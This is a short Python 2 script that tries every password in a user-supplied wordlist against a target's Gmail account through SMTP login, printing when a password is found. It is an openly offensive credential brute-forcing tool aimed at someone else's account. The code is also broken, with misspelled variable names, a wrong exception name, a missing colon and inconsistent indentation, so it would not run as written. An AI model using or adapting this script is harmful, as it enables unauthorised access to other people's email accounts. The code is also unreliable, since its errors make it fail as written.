import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smptserver.ehlo()
smtpsever.starttls()

user = raw_input("Enter the target's email address : ")
passwfile = raw_input("Enter the password file name : ")
passwfile = open(passwfile,"r")

for password in passwfile:
          try:
                 smtpserver.login(user,password)

                 print "[+] Password Found : %s" % password
                 break;
         except smtplib.smtpAuthenticationError
                 print "[!] password Incorrect: %s" % password